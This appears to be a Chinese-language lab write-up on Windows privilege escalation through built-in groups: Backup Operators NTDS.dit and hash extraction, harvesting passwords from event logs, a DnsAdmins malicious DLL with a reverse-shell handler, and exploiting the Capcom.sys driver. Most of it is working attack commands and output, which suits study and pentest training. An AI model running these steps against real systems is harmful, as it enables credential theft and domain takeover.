<pre><code class="language-powershell-session">PS C:\htb&gt; icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files</code></pre>
<p>如果一切按计划进行，我们现在可以从命令行读取目标文件，如果有 RDP 权限就打开它，或者复制到我们的攻击系统进行额外处理（比如破解 KeePass 数据库的密码）。</p>
<ol><li>阅读文件</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!</code></pre>
<p>完成这些更改后，我们会尽一切努力恢复权限和文件所有权。如果因某种原因无法做到，我们应通知客户，并在报告交付物的附录中详细记录修改内容。再次强调，利用这种许可可能被视为破坏性行为，必须非常谨慎地进行。有些客户可能希望我们记录执行该动作的能力作为配置错误的证据，但由于潜在影响，我们不会充分利用该漏洞。</p>
<p><strong>何时使用？</strong> 值得关注的文件</p>
<pre><code class="language-shell-session">c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav</code></pre>
<h2>Windows 组权限</h2>
<p><strong>Windows Built-in</strong></p>
<p>如 <code>Windows 权限概览</code>部分所述，Windows 服务器，尤其是域控制器，内置了多种组，这些组要么随作系统自带，要么在系统安装 Active Directory 域服务角色以将服务器升级为域控制器时添加。许多这些组织会赋予成员特殊权限，有些甚至可以用于提升服务器或域控制器的权限。 这里列出了所有内置的 Windows 组，并附有每个组的详细描述。本页面详细列出了 Active Directory 中特权账户和组的列表。无论我们是否访问了其中一个或多个成员账户，或在评估过程中发现自己在其中一个或多个群体中存在过多/不必要的成员身份，都必须理解这些群体成员身份的影响。在我们的目的上，我们将重点介绍以下内置组。这些组从 Server 2008 R2 一直存在至今，除了 Hyper-V 管理员（由 Server 2012 引入）。</p>
<p>账户可以分配给这些组，以强制执行最小权限，避免为执行特定任务（如备份）而创建更多域管理员和企业管理员。有时供应商应用还会要求某些权限，可以通过将服务账户分配给这些组之一来获得。账户也可能因意外添加，或在测试特定工具或脚本后遗留。我们应始终检查这些小组，并在报告中附录每个小组成员名单，供客户审核并判断是否仍需访问。</p>
<div class="post-table-wrap"><table><thead><tr><th>备用</th><th>事件日志阅读器</th><th>管理员</th></tr></thead><tbody><tr><td>管理员</td><td>打印</td><td>服务器运营者</td></tr></tbody></table></div>
<h3>Backup Operators 备份操作员</h3>
<p>在登录到目标机器后，我们可以使用命令 <code>whoami /groups</code> 显示当前的组成员。加入该组成员可获得 <code>SeBackup</code> 和 <code>SeRestore</code> 的特权。<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges" target="_blank" rel="noreferrer">SeBackupPrivilege</a> 允许我们遍历任何文件夹并列出文件夹内容。这样即使文件夹的访问控制列表（ACL）中没有访问控制条目（ACE），也能让我们从文件夹复制文件。然而，我们无法使用标准的复制命令来实现这一点。相反，我们需要程序化地复制数据，并确保指定 <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" target="_blank" rel="noreferrer">FILE_FLAG_BACKUP_SEMANTICS</a> 标志。</p>
<p><strong>如何在未获得必要权限的情况下访问敏感信息。</strong></p>
<p>我们可以利用这个 <a href="https://github.com/giuliano108/SeBackupPrivilege" target="_blank" rel="noreferrer">PoC</a> 来利用 <code>SeBackupPrivilege</code>，复制这个文件。首先，让我们在 PowerShell 会话中导入库。</p>
<ol><li>Importing Libraries</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</code></pre>
<p>我们来检查一下是否启用<code>了 SeBackupPrivilege</code>，方法是调用 <code>whoami /priv</code> 或 <code>Get-SeBackupPrivilege</code> cmdlet。如果该权限被禁用，我们可以用 <code>Set-SeBackupPrivilege</code> 来启用它。 &gt;注意：根据服务器设置，可能需要生成一个提升的 CMD 提示来绕过 UAC 并获得此权限。</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-SeBackupPrivilege

SeBackupPrivilege is disabled</code></pre>
<p>如果该权限被禁用，我们可以用 <code>Set-SeBackupPrivilege</code> 来启用它。</p>
<ol><li>Enabling SeBackupPrivilege</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Set-SeBackupPrivilege
PS C:\htb&gt; Get-SeBackupPrivilege

SeBackupPrivilege is enabled</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p>如上所述，该特权是成功实现的。现在可以利用这一权限复制任何受保护的文件。</p>
<ol><li>Copying a Protected File</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt


PS C:\htb&gt; cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes


PS C:\htb&gt;  cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

&lt;...SNIP...&gt;</code></pre>
<p><strong>攻击DC - Copying NTDS.dit</strong> 该组还允许本地登录域控制器。活动目录数据库 <code>NTDS.dit</code> 是一个非常有吸引力的目标，因为它包含了该域内所有用户和计算机对象的 NTLM 哈希值。然而，该文件被锁定，且非特权用户无法访问。</p>
<p>由于 <code>NTDS.dit</code> 文件默认被锁定，我们可以使用 Windows 的 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" target="_blank" rel="noreferrer">diskshadow</a> 工具创建 <code>C</code> 盘的影子副本，并将其暴露为 <code>E</code> 盘。这个影子副本中的 NTDS.dit 不会被系统使用。</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW&gt; set verbose on
DISKSHADOW&gt; set metadata C:\Windows\Temp\meta.cab
DISKSHADOW&gt; set context clientaccessible
DISKSHADOW&gt; set context persistent
DISKSHADOW&gt; begin backup
DISKSHADOW&gt; add volume C: alias cdrive
DISKSHADOW&gt; create
DISKSHADOW&gt; expose %cdrive% E:
DISKSHADOW&gt; end backup
DISKSHADOW&gt; exit

PS C:\htb&gt; dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows</code></pre>
<p>接下来，我们可以使用 <code>Copy-FileSeBackupPrivilege</code> cmdlet 绕过 ACL，将 NTDS.dit 复制到本地。</p>
<ol><li>Copying NTDS.dit Locally</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes</code></pre>
<p>&gt;SYSTEM Registry Hives: 在 Windows 里，<strong>Registry（注册表）</strong> 是一个分层数据库，用来存系统配置。</p>
<ol><li>备份SAM和SYSTEM Registry Hives</li></ol>
<p>该权限还允许我们备份 SAM 和 SYSTEM Registry Hives，使用 Impacket's <code>secretsdump.py</code> 等工具离线提取本地账户凭证</p>
<pre><code class="language-cmd-session">C:\htb&gt; reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb&gt; reg save HKLM\SAM SAM.SAV

The operation completed successfully.</code></pre>
<p>值得注意的是，如果某个文件夹或文件对当前用户或他们所属的组有明确的拒绝访问，即使指定了 <code>FILE_FLAG_BACKUP_SEMANTICS</code> 标志，也会阻止我们访问该文件。</p>
<p>提取完 NTDS.dit 后，我们可以使用 <code>secretsdump.py</code> 或 PowerShell <code>DSInternals</code> 模块等工具提取所有 Active Directory 账户凭证。我们用 <code>DSInternals</code> 获取该域名<code>管理员</code>账户的 NTLM 哈希值。</p>
<ol><li>从 NTDS.dit 中提取凭据</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Import-Module .\DSInternals.psd1
PS C:\htb&gt; $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb&gt; Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 5/6/2021 5:40:30 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-669053619-2741956077-1013132368-512
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: d60dfbbf20548938
      OldCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 94c300d0e47775b407f2496a5cca1a0a
          Iterations: 4096
        DES_CBC_MD5
          Key: d60dfbbf20548938
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:</code></pre>
<p>我们也可以离线使用 <code>SecretsDump</code> 从之前获得的 <code>ntds.dit</code> 文件中提取哈希值。这些数据随后可用于哈希传递以访问额外资源，或通过 <code>Hashcat</code> 离线破解以获得更多访问权限。如果被破解，我们还能为客户提供密码破解统计数据，详细了解其域名内的密码强度和使用情况，并建议改进密码策略（增加最短密码长度，创建禁止词典等）。</p>
<ol><li>使用 SecretsDump 提取哈希值</li></ol>
<pre><code class="language-shell-session">henduoduo@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

&lt;SNIP&gt;</code></pre>
<p><strong>Robocopy</strong> 用 Robocopy 复制文件 内置的工具 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy" target="_blank" rel="noreferrer">robocopy</a> 也可以用来备份文件。Robocopy 是一种命令行目录复制工具。它可以用于创建备份作业，并包含多线程复制、自动重试、恢复复制等功能。Robocopy 与<code>复制</code>命令的不同之处在于，它不仅能复制所有文件，还能检查目标目录并删除不再在源目录中的文件。它还能在复制前比较文件，节省时间，避免复制自上次复制/备份工作后未更改的文件。</p>
<pre><code class="language-cmd-session">C:\htb&gt; robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM</code></pre>
<h3>Event Log Readers 事件日志读取者</h3>
<p>假设启用了对进程创建事件及相应命令行值的审计 。此时，该信息会作为事件 ID 4688 保存到 Windows 安全事件日志中：新进程已创建 。组织可以支持进程命令行的日志记录，帮助防御者监控和识别可能的恶意行为，识别系统中不应存在的二进制文件。这些数据可以被传输到 SIEM 工具，或导入搜索工具（如 ElasticSearch），以便防御者了解网络系统中运行的二进制文件。这些工具随后会标记任何潜在的恶意活动，比如市场营销主管工作站运行的 <code>whoami</code>、<code>netstat</code> 和<code>任务列表</code>命令。</p>
<p>在 Windows 安全日志中： <strong>4688 = 新进程已创建（A new process has been created）</strong></p>
<p>也就是：</p>
<blockquote>当一个程序被启动时，系统会写一条日志。</blockquote>
<p>例如：</p>
<p>都会产生 4688。</p>
<ul><li>打开 cmd.exe</li><li>运行 powershell</li><li>执行 whoami</li><li>启动某个 exe</li></ul>
<p>本研究展示了攻击者在初次访问后最常执行的一些命令（任务<code>列表</code> 、<code>ver</code>、<code>ipconfig</code>、<code>systeminfo</code> 等）、侦察（<code>dir</code>、<code>net view</code>、<code>ping</code>、 <code>网络使用</code> 、 <code>类型</code>等）以及在网络内传播恶意软件（<code>at</code>、<code>reg</code>、<code>wmic</code>、<code>wusa</code>，等等）。除了监控这些命令的运行外，组织还可以更进一步，利用经过精细调整的 AppLocker 规则限制特定命令的执行。对于安全预算紧张的组织来说，利用 Microsoft 内置工具可以为主机层面的网络活动提供极佳的可视化。大多数现代企业 EDR 工具都能进行检测/阻断，但由于预算和人员限制，许多组织难以实现。这个小例子表明，安全改进，如网络和主机层的可见性，可以用最少的努力、成本和巨大的影响完成。</p>
<p>几年前，我对一家中型组织进行了渗透测试，当时安全团队很小，没有企业 EDR，但使用的配置与上述类似（审计流程创建和命令行值）。他们抓住并控制了我的一名团队成员，当时他们用财务部门工作站的一名成员执行<code>tasklist</code>命令（在用 <code>Responder</code> 捕获凭证并离线破解后）。</p>
<p>管理员或事件日志阅读?redirectedfrom=MSDN#event-log-readers)组成员有权访问此日志。系统管理员可能会想将高级用户或开发者加入该组，以执行某些任务而无需授予管理员权限。</p>
<p><strong>确认group成员</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.</code></pre>
<p>发布了涵盖所有内置 Windows 命令的参考指南 ，包括语法、参数和示例。许多 Windows 命令支持以密码作为参数传递，如果启用了对进程命令行的审计，这些敏感信息将被捕获。</p>
<p>我们可以用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil" target="_blank" rel="noreferrer">wevtutil</a> 工具和 <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1" target="_blank" rel="noreferrer">Get-WinEvent</a> PowerShell 命令符从命令行查询 Windows 事件。</p>
<p><strong>使用 wevtutil 搜索安全日志</strong></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
<p>我们也可以用<code>参数 /u</code> 和 <code>/p</code> 为 <code>wevtutil</code> 指定备用凭证。</p>
<p><strong>Passing Credentials to wevtutil</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"</code></pre>
<p>对于 <code>Get-WinEvent</code>，语法如下。在此示例中，我们过滤进程创建事件（4688），其中进程命令行包含 <code>/user</code>。</p>
<blockquote>注意：使用 <code>Get-WInEvent</code> 搜索<code>安全</code>事件日志需要管理员权限或对注册表密钥 <code>HKLM\System\CurrentControlSet\Services\Eventlog\Security</code> 进行权限调整。仅仅是<code>事件日志阅读</code>组成员身份是不够的。</blockquote>
<p><strong>使用 Get-WinEvent 搜索安全日志</strong></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
<p>该 cmdlet 也可以作为另一个用户使用 <code>-Credential</code> 参数运行。 其他日志包括 PowerShell 作日志，如果启用脚本块或模块日志，可能还包含敏感信息或凭证。该日志对无权限用户开放。</p>
<h3>DnsAdmins DNS 管理员</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins" target="_blank" rel="noreferrer">DnsAdmins</a> 组的成员可以访问网络上的 DNS 信息。Windows DNS 服务支持自定义插件，并能调用插件中的函数来解决不在任何本地托管 DNS 区域范围内的名称查询。DNS 服务以 <code>NT AUTHORITY\SYSTEM</code> 形式运行，因此该组成员身份可能被用来提升域控制器的权限，或在有独立服务器作为该域的 DNS 服务器时升级。可以使用内置的 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd" target="_blank" rel="noreferrer">dnscmd</a> 工具来指定插件 DLL 的路径。正如这篇优秀文章中详细说明的，当域名控制器上运行 DNS 时（非常常见）可以实施以下攻击：</p>
<p>管理通过 RPC 进行</p>
<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" target="_blank" rel="noreferrer">ServerLevelPluginDll</a> 允许我们加载自定义 DLL，且无需对 DLL 路径进行任何验证。这可以通过命令行中的 <code>dnscmd</code> 工具完成</p>
<p>当 <code>DnsAdmins</code> 组的成员执行下面的 <code>dnscmd</code> 命令时，注册 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> 表密钥会被填充</p>
<p>当 DNS 服务重启时，该路径中的 DLL 会被加载（即域控制器机器账户可以访问的网络共享）</p>
<p>攻击者可以加载自定义 DLL 以获取反向 shell，甚至加载如 Mimikatz 等工具作为 DLL 来倾倒凭证。</p>
<ul><li>DNS management is performed over RPC</li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" target="_blank" rel="noreferrer">ServerLevelPluginDll</a> allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the <code>dnscmd</code> tool from the command line</li><li>When a member of the <code>DnsAdmins</code> group runs the <code>dnscmd</code> command below, the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> registry key is populated</li><li>When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)</li><li>An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.</li></ul>
<p><strong>利用 DnsAdmins 访问权限, Leveraging DnsAdmins Access</strong></p>
<p>我们可以生成一个恶意 DLL，使用 <code>msfvenom</code> 将用户添加到<code>domain admins</code>群中。</p>
<ol><li>生成恶意 DLL</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll</code></pre>
<p>接下来，启动一个 Python HTTP 服务器。</p>
<ol><li>启动本地HTTP服务器</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -</code></pre>
<p>把文件下载给目标。</p>
<ol><li>向目标下载文件</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt;  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"</code></pre>
<p>我们用 msfconsole 打开一个监听器，使用这个方法：</p>
<pre><code>msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4242; run"</code></pre>
<ol><li>加载 dll 文件：</li></ol>
<pre><code>dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\reverseshell.dll</code></pre>
<p>Press enter or click to view image in full size</p>
<img src="https://miro.medium.com/v2/resize:fit:1050/1*SlaFH6tJgHJ8x4WtofXHwQ.png" alt="Referenced image" />
<ol><li>在 cmd 中停止和开始 DNS：</li></ol>
<pre><code class="language-cmd">sc stop dns
sc start dns</code></pre>
<img src="https://miro.medium.com/v2/resize:fit:971/1*xZ847WY3IpPi1az0fgofwA.png" alt="Referenced image" />
<p>然后我们得到一个反向壳同时：</p>
<p>Press enter or click to view image in full size</p>
<img src="https://miro.medium.com/v2/resize:fit:1050/1*oWFADwnorLf_xkRH5N1OVw.png" alt="Referenced image" />
<p>now you can get the flag on:</p>
<pre><code class="language-cmd">c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</code></pre>
<h3>Print Operators 打印操作员</h3>
<p>打印操作员组是另一个权限极高的组，它赋予其成员<code>SeLoadDriverPrivilege</code>管理、创建、共享和删除连接到域控制器的打印机的权限，以及本地登录域控制器并将其关闭的权限。如果我们发出命令<code>whoami /priv</code>，并且在非提升权限的上下文中看不到该组<code>SeLoadDriverPrivilege</code>，则需要绕过用户帐户控制 (UAC)。</p>
<ol><li>确认权限</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled</code></pre>
<p>UACMe代码库提供了一个全面的 UAC 绕过方法列表，可从命令行使用。或者，我们也可以从图形用户界面 (GUI) 打开一个管理员命令 shell，并输入属于“打印操作员”组的帐户凭据。如果我们再次检查权限，<code>SeLoadDriverPrivilege</code>会发现该权限可见但已被禁用。</p>
<ol><li>再次确认权限</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</code></pre>
<p>众所周知，该驱动程序<code>Capcom.sys</code>包含允许任何用户以 SYSTEM 权限执行 shellcode 的功能。我们可以利用这些权限加载此易受攻击的驱动程序并提升权限。我们可以使用此工具加载驱动程序。该 PoC 不仅能够启用权限，还能为我们加载驱动程序。</p>
<p>下载到本地并进行编辑，将下面的包含内容粘贴到相应位置。</p>
<pre><code class="language-c">#include &lt;windows.h&gt;
#include &lt;assert.h&gt;
#include &lt;winternl.h&gt;
#include &lt;sddl.h&gt;
#include &lt;stdio.h&gt;
#include "tchar.h"</code></pre>
<p>接下来，从 Visual Studio 2019 开发人员命令提示符中，使用<strong>cl.exe</strong>进行编译。</p>
<p><strong>使用cl.exe编译</strong></p>
<pre><code class="language-cmd-session">C:\Users\mrb3n\Desktop\Print Operators&gt;cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj</code></pre>
<p><strong>添加驱动程序引用</strong> <code>Capcom.sys</code>接下来，从这里下载驱动程序，并将其保存到指定位置<code>C:\temp</code>。执行以下命令，在 HKEY_CURRENT_USER 树下添加对该驱动程序的引用。</p>
<pre><code class="language-cmd-session">C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.</code></pre>
<p><code>\??\</code>用于引用恶意驱动程序映像路径的特殊语法是一种NT 对象路径。Win32 API 将解析并解析此路径，以便正确定位并加载我们的恶意驱动程序。</p>
<p><strong>确认驱动程序未加载</strong> 使用 Nirsoft 的<a href="http://www.nirsoft.net/utils/driverview.html" target="_blank" rel="noreferrer">DriverView.exe</a>，我们可以验证 Capcom.sys 驱动程序未加载。</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; .\DriverView.exe /stext drivers.txt
PS C:\htb&gt; cat drivers.txt | Select-String -pattern Capcom</code></pre>
<p><strong>验证权限是否已启用</strong> 运行该<code>EnableSeLoadDriverPrivilege.exe</code>二进制文件。</p>
<pre><code class="language-cmd-session">C:\htb&gt; EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0</code></pre>
<p><strong>确认Capcom驱动程序已列出</strong></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; .\DriverView.exe /stext drivers.txt
PS C:\htb&gt; cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys</code></pre>
<p><strong>使用ExploitCapcom工具提升权限</strong> 要利用 Capcom.sys，我们可以先用 Visual Studio 编译，然后使用ExploitCapcom工具。</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched</code></pre>
